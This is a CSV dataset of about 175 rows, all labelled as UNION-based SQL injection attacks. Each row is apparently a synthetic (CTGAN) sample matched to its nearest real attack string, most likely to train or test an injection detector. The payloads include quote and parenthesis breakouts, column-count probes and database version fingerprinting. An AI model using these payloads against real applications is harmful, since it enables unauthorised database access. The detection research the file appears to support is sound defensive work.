id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000021,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000307,7.232600730477973
CTGAN_000022,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R000092,4.788427256539666
CTGAN_000023,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,8.005665855386905
CTGAN_000024,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,7.0274119545632185
CTGAN_000025,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,5.527519593357278
CTGAN_000026,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000049,8.677991204022225
CTGAN_000027,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,10.213769196505872
CTGAN_000028,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,5.0873646522715505
CTGAN_000029,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R000208,6.214886901330479
CTGAN_000030,attack,union,"1' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000179,9.317968959725434
CTGAN_000031,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,8.746443357469683
CTGAN_000032,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,6.88916895177727
CTGAN_000033,attack,union,"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000268,7.053357705058344
CTGAN_000034,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,9.915097877475196
CTGAN_000035,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000063,7.6736683249644555
CTGAN_000036,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,11.527361868619943
CTGAN_000037,attack,union," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000039,8.583151289533816
CTGAN_000038,attack,union,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000088,6.568136178817756
CTGAN_000039,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000096,5.728477711769489
CTGAN_000040,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,8.87494567231715
CTGAN_000041,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R000276,5.443152096879286
CTGAN_000042,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,5.882763630231831
CTGAN_000043,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,8.36449377437904
CTGAN_000044,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000086,8.333608293787758
CTGAN_000045,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000036,5.867156082707321
CTGAN_000046,attack,union,"-6363""  )   where 4043  =  4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",nearest_attack_euclidean,R000311,5.286622862125266
CTGAN_000047,attack,union,union all select @@version--,nearest_attack_euclidean,R000023,9.648935812778873
CTGAN_000048,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,7.0894827043257616
CTGAN_000049,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000080,5.283301411972108
CTGAN_000050,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R000219,7.323825682217748
CTGAN_000051,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,4.958462055683792
CTGAN_000052,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R000263,7.422099823295132
CTGAN_000053,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,5.766603671301061
CTGAN_000054,attack,union,"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",nearest_attack_euclidean,R000203,6.362933285486377
CTGAN_000055,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,8.0245502508757
CTGAN_000056,attack,union,"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",nearest_attack_euclidean,R000158,7.134466173740223
CTGAN_000057,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000164,6.09616348882004
CTGAN_000058,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,11.1390870836025
CTGAN_000059,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,6.39685553989328
CTGAN_000060,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,10.202948154310524
CTGAN_000061,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,6.00623394379967
CTGAN_000062,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000225,7.266756647794406
CTGAN_000063,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,5.969845051930757
CTGAN_000064,attack,union,"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000189,6.748950503374243
CTGAN_000065,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000001,10.163186469198623
CTGAN_000066,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R000276,6.117141563295133
CTGAN_000067,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,6.362123873997675
CTGAN_000068,attack,union,"1'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000295,6.426182740307776
CTGAN_000069,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,7.522161191397114
CTGAN_000070,attack,union,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000075,6.70963730256974
CTGAN_000071,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000257,6.168554764534622
CTGAN_000072,attack,union,"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",nearest_attack_euclidean,R000195,6.952668447278023
CTGAN_000073,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,11.502489539177715
CTGAN_000074,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000070,5.553956510169817
CTGAN_000075,attack,union,"1%' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000171,9.319183869736255
CTGAN_000076,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R000219,4.781584726920818
CTGAN_000077,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,5.543074594420212
CTGAN_000078,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000196,5.996676481906517
CTGAN_000079,attack,union,"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",nearest_attack_euclidean,R000195,6.173910524913378
CTGAN_000080,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000067,7.369067539426468
CTGAN_000081,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000067,7.072594898068847
CTGAN_000082,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000031,8.623861742367415
CTGAN_000083,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000197,5.427739206651778
CTGAN_000084,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,10.037415481954078
CTGAN_000085,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000068,5.607316898680916
CTGAN_000086,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000244,5.388111664872332
CTGAN_000087,attack,union,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000221,6.133491027239093
CTGAN_000088,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R000276,8.41159175941491
CTGAN_000089,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,5.905525032915359
CTGAN_000090,attack,union,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000221,6.606928430035882
CTGAN_000091,attack,union,"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000280,4.818316941128206
CTGAN_000092,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000307,6.872238866827432
CTGAN_000093,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000150,4.324476947518629
CTGAN_000094,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,4.628367942080479
CTGAN_000095,attack,union,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",nearest_attack_euclidean,R000118,5.165132450424537
CTGAN_000096,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R000219,6.862431377400323
CTGAN_000097,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,6.434914686058166
CTGAN_000098,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000057,6.714676195784492
CTGAN_000099,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000095,5.943606867530984
CTGAN_000100,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000042,6.529488470710684
CTGAN_000101,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,8.82914863113342
CTGAN_000102,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,4.206102366408641
CTGAN_000103,attack,union,"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",nearest_attack_euclidean,R000203,5.7891888369274564
CTGAN_000104,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000305,7.424428817988143
CTGAN_000105,attack,union,"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000082,7.20147871941261
CTGAN_000106,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,8.589006818631475
CTGAN_000107,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000058,7.664807382563211
CTGAN_000108,attack,union,"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000185,6.230694286133656
CTGAN_000109,attack,union,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",nearest_attack_euclidean,R000118,6.524934957911243
CTGAN_000110,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000096,8.38571803809382
CTGAN_000111,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000045,7.426781347801629
CTGAN_000112,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000055,6.3160117574754295
CTGAN_000113,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,6.15031433432809
CTGAN_000114,attack,union,"1' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000179,6.150940205866774
CTGAN_000115,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,6.269562983368241
CTGAN_000116,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,6.550826493905717
CTGAN_000117,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000044,6.545892144514832
CTGAN_000118,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000164,6.151897303274685
CTGAN_000119,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000226,4.369003538614616
CTGAN_000120,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000149,6.954260124849212
CTGAN_000121,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000164,6.913899756619497
CTGAN_000122,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,9.158840125628837
CTGAN_000123,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,9.18734282160496
CTGAN_000124,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000086,6.824216509476216
CTGAN_000125,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000205,5.080958731272543
CTGAN_000126,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,9.772150955373228
CTGAN_000127,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,9.229862921095188
CTGAN_000128,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,6.0653546347655345
CTGAN_000129,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000164,6.252617516273618
CTGAN_000130,attack,union,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000088,6.572955953845929
CTGAN_000131,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,10.548645025707817
CTGAN_000132,attack,union,"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000052,7.056245617786539
CTGAN_000133,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000031,7.45213308345125
CTGAN_000134,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,10.619355369148245
CTGAN_000135,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000267,5.652571463768435
CTGAN_000136,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000150,6.327167007062451
CTGAN_000137,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,8.321500328695022
CTGAN_000138,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,9.276549598345914
CTGAN_000139,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,11.92732561277859
CTGAN_000140,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000305,8.459193396574765
CTGAN_000141,attack,union,"1'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000295,5.0589121280464875
CTGAN_000142,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,6.969480611756561
CTGAN_000143,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000031,8.374932311002816
CTGAN_000144,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000096,6.165009755155196
CTGAN_000145,attack,union,"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000280,6.918713625503683
CTGAN_000146,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000096,6.551440074493282
CTGAN_000147,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,8.232565994499938
CTGAN_000148,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,4.761033507957891
CTGAN_000149,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000190,6.482452629968515
CTGAN_000150,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000190,7.306613272373931
CTGAN_000151,attack,union," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",nearest_attack_euclidean,R000021,8.337997699043083
CTGAN_000152,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000197,4.964210085837042
CTGAN_000153,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000067,5.226987706297224
CTGAN_000154,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000070,5.713345343228355
CTGAN_000155,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,4.61251358186705
CTGAN_000156,attack,union,"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",nearest_attack_euclidean,R000195,4.831656363019199
CTGAN_000157,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,4.020325432200698
CTGAN_000158,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,6.404397848527877
CTGAN_000159,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,4.543386188380731
CTGAN_000160,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,8.196636357085207
CTGAN_000161,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,5.961369671861073
CTGAN_000162,attack,union,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",nearest_attack_euclidean,R000182,6.62882227464597
CTGAN_000163,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000113,9.838680590150222
CTGAN_000164,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,7.764949442355479
CTGAN_000165,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,8.64318139679612
CTGAN_000166,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000257,6.683514130626925
CTGAN_000167,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000042,6.336251172974944
CTGAN_000168,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,10.553113101519612
CTGAN_000169,attack,union,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000075,6.293614360195014
CTGAN_000170,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000197,6.516389062242408
CTGAN_000171,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,6.300003085164252
CTGAN_000172,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,10.106997258296815
CTGAN_000173,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000225,7.515889505239737
CTGAN_000174,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,7.23792807355436
CTGAN_000175,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000096,6.13445862923462
CTGAN_000176,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,5.257807064694959
CTGAN_000177,attack,union,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000088,7.679217042946589
CTGAN_000178,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000277,5.865440002380024
CTGAN_000179,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000051,6.14102326213494
CTGAN_000180,attack,union,"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000288,8.948019967717194
CTGAN_000181,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,5.698505337435659
CTGAN_000182,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000108,7.729354423418527
CTGAN_000183,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,5.204081653423525
CTGAN_000184,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000048,7.074349418888025
CTGAN_000185,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R000309,5.966438483423142
CTGAN_000186,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000259,4.759130388011947
CTGAN_000187,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000127,6.17933693783555
CTGAN_000188,attack,union,"-3177'   )    )    union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",nearest_attack_euclidean,R000157,7.273442409983181
CTGAN_000189,attack,union,"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000288,5.810927779694901
CTGAN_000190,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,8.519399054155942
CTGAN_000191,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R000294,7.267624270079242
CTGAN_000192,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,7.983681384491459
CTGAN_000193,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000222,7.866012587814314
CTGAN_000194,attack,union,"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000185,6.149810425593351
CTGAN_000195,attack,union,"-9008'  )   union all select 4976,4976,4976,4976#",nearest_attack_euclidean,R000256,8.673465633565767
CTGAN_000196,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,10.690208001000073
